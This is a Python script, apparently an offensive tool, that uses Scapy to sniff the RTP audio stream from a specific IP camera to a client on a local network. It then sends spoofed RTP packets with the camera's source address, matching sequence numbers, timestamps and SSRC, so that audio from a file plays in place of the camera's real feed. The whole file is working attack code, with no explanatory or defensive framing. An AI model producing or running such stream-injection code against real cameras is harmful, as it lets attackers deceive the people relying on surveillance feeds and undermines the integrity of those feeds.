from scapy.all import IP, UDP, RTP, Raw, send, sniff
import time
import struct

IFACE = "en0"
IP_CAMERA = "192.168.0.81"
IP_CLIENT = "192.168.0.162"
AUDIO_START_DELAY = 1         

RTP_PORT_CAMERA = 0
RTP_PORT_CLIENT = 0
SSRC_INJECTED = 0x12345678
INIT_SEQ_NUM = 0
PAYLOAD_TYPE = 8           

# Standard G.711 sample rate
SAMPLE_RATE = 8000           
# Typical packet duration
PACKET_DURATION_MS = 20      
SAMPLES_PER_PACKET = int(SAMPLE_RATE * PACKET_DURATION_MS / 1000) 
TIMESTAMP_INC = SAMPLES_PER_PACKET
PACKET_INTERVAL = PACKET_DURATION_MS / 1000.0  


def get_stream_params():
    print(f"[*] Sniffing for audio stream parameters on {IFACE}...")
    print(f"[*] Collecting multiple packets for stable sync...")

    audio_packets = []
    attempts = 0
    max_attempts = 50

    while len(audio_packets) < 5 and attempts < max_attempts:
        packets = sniff(count=1, filter=f"udp and src {IP_CAMERA} and dst {IP_CLIENT}", iface=IFACE, timeout=5)
        attempts += 1

        if not packets:
            continue

        pkt = packets[0]
        pt = -1

        # Extract the payload type to check if it's audio
        if RTP in pkt:
            pt = pkt[RTP].payload_type
        else:
            try:
                udp_payload = bytes(pkt[UDP].payload)
                if len(udp_payload) >= 12:
                    pt = udp_payload[1] & 0x7F
            except:
                continue

        # Check for Audio (PCMU=0, PCMA=8)
        if pt == 8 or pt == 0:
            audio_packets.append(pkt)
            print(f"[*] Captured audio packet {len(audio_packets)}/5...")

    if not audio_packets:
        print("[!] Failed to capture audio packets!")
        return INIT_SEQ_NUM, 0, SSRC_INJECTED, PAYLOAD_TYPE, 0, 0

    pkt = audio_packets[-1]

    if RTP in pkt:
        rtp = pkt[RTP]
        print(f"[+] Synced to AUDIO! Seq={rtp.sequence}, TS={rtp.timestamp}, SSRC={hex(rtp.sourcesync)}, PT={rtp.payload_type}")
        return rtp.sequence + 10, rtp.timestamp + (TIMESTAMP_INC * 10), rtp.sourcesync, rtp.payload_type, pkt[UDP].sport, pkt[UDP].dport
    else:
        udp_payload = bytes(pkt[UDP].payload)
        header = struct.unpack("!HHII", udp_payload[:12])
        seq = header[1]
        ts = header[2]
        ssrc = header[3]
        pt = udp_payload[1] & 0x7F
        print(f"[+] Synced to AUDIO! Seq={seq}, TS={ts}, SSRC={hex(ssrc)}, PT={pt}")
        return seq + 10, ts + (TIMESTAMP_INC * 10), ssrc, pt, pkt[UDP].sport, pkt[UDP].dport

def inject_audio(audio_file):
    sequence_num, timestamp, ssrc, payload_type, sport, dport = get_stream_params()

    if sport == 0 or dport == 0:
        print("[!] Failed to get stream parameters. Aborting.")
        return

    print(f"[*] Waiting {AUDIO_START_DELAY}s before injection...")
    time.sleep(AUDIO_START_DELAY)

    print(f"[*] Starting AUDIO injection on {IFACE} -> SrcPort:{sport} DstPort:{dport}...")
    print(f"[*] Stream params: SSRC={hex(ssrc)}, PT={payload_type}")

    try:
        with open(audio_file, 'rb') as f:
            raw_audio = f.read()

        chunks = [raw_audio[i:i + SAMPLES_PER_PACKET] for i in range(0, len(raw_audio), SAMPLES_PER_PACKET)]

        print(f"[*] Injecting {len(chunks)} audio packets ({len(raw_audio)} bytes)...")
        print(f"[*] Duration: ~{len(chunks) * PACKET_DURATION_MS / 1000:.1f} seconds")

        start_time = time.time()

        for i, chunk in enumerate(chunks):
            # Ensures the last packet still has 160 byte payload size
            if len(chunk) < SAMPLES_PER_PACKET:
                chunk += b'\x00' * (SAMPLES_PER_PACKET - len(chunk))

            packet = IP(src=IP_CAMERA, dst=IP_CLIENT) / \
                     UDP(sport=sport, dport=dport) / \
                     RTP(
                         version=2,
                         payload_type=payload_type,
                         sequence=sequence_num,
                         timestamp=timestamp,
                         sourcesync=ssrc,
                         marker=0
                     ) / Raw(load=chunk)

            del packet[IP].chksum
            del packet[UDP].chksum

            send(packet, iface=IFACE, verbose=False)

            # The % makes sure these fields don't grow forever (they are 16 and 32 bit respectively in RTP)
            sequence_num = (sequence_num + 1) % 65536
            timestamp = (timestamp + TIMESTAMP_INC) % 4294967296

            if (i + 1) % 50 == 0:
                elapsed = time.time() - start_time
                print(f"[*] Progress: {i+1}/{len(chunks)} packets ({elapsed:.1f}s)")

            target_time = start_time + (i + 1) * PACKET_INTERVAL
            sleep_time = target_time - time.time()
            if sleep_time > 0:
                time.sleep(sleep_time)

    except FileNotFoundError:
        print(f"[!] Audio file not found: {audio_file}")
    except Exception as e:
        print(f"[!] Audio Injection failed: {e}")
        import traceback
        traceback.print_exc()
    finally:
        elapsed = time.time() - start_time
        print(f"\n[+] Audio Injection finished in {elapsed:.1f}s")
        print(f"[+] Sent {len(chunks)} packets")

if __name__ == "__main__":
    
    inject_audio("raw.audio")
